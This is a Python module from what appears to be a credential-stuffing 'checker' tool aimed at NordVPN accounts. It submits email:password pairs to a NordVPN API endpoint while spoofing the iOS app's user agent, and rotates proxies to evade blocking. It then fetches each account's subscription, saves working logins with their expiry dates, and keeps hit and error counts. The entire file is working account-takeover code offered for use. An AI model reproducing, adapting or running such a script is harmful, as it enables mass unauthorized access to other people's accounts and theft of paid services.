from modules.variables import Checker
from requests import get,post
from modules.functions import set_proxy, log, save, bad_proxy
from base64 import b64encode
from datetime import datetime

def check(email:str,password:str):
    retries = 0
    while retries != Checker.retries:
        proxy = set_proxy()
        proxy_set = set_proxy(proxy)

        data = f"password={password}&username={email}"
        header_1 = {
            "Content-Type":"application/x-www-form-urlencoded",
            "Host": "zwyr157wwiu6eior.com" ,
            "Connection": "keep-alive" ,
            "Accept": "*/*" ,
            "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
            "Content-Length": "51" ,
            "Accept-Language": "en-us" ,
            "Accept-Encoding": "gzip, deflate, br"
        }
        header_2 = {
            "User-Agent": "NordApp iOS (applestore/5.0.5) iOS/13.3.1" ,
            "Authorization": "" 
        }
        try:
            a = post("https://zwyr157wwiu6eior.com/v1/users/tokens",data=data,headers=header_1,proxies=proxy_set,timeout=Checker.timeout)
            if "Invalid username" in a.text or "Invalid password" in a.text:
                retries += 1
            elif "token" in a.text:
                token = b64encode(("token:" + a.json()["token"]).encode()).decode()
                header_2["Authorization"] = f"Basic {token}"
                b = get("https://zwyr157wwiu6eior.com/v1/users/services",headers=header_2,proxies=proxy_set,timeout=Checker.timeout)
                if b.text == "[]":
                    if not Checker.cui:
                        log("custom",email+":"+password,"NordVPN")
                    save("NordVPN","custom",Checker.time,email+":"+password)
                    Checker.custom += 1
                    Checker.cpm += 1
                    return
                else:
                    data = b.json()[0]
                    date = data["expires_at"]
                    expire = int(data["expires_at"].split(" ")[0].replace("-",""))
                    nowtime = int(datetime.now().strftime("%Y%m%d"))
                    if expire > nowtime:
                        if not Checker.cui:
                            log("good",email+":"+password,"NordVPN")
                        save("NordVPN","good",Checker.time,email+":"+password+f" | Expire: {date}")
                        Checker.good += 1
                        Checker.cpm += 1
                        return
                    else:
                        if not Checker.cui:
                            log("custom",email+":"+password,"NordVPN")
                        save("NordVPN","custom",Checker.time,email+":"+password)
                        Checker.custom += 1
                        Checker.cpm += 1
                        return
            else:
                raise
        except:
            bad_proxy(proxy)
            Checker.errors += 1
    Checker.bad += 1 
    Checker.cpm += 1
    return